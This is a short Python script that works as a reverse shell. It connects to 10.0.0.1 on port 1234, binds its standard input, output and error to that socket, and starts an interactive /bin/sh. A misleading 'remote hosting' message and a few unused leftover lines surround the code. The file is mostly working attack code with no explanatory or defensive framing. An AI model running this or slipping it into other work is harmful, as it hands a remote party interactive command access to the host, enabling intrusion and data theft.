#!/usr/bin/env python

import socket
import subprocess
import os

Directory = []
os.listdir()

print("remote hosting...\n")
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1", 1234))

os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh", "-i"])

print(s)
print(p)

exit;
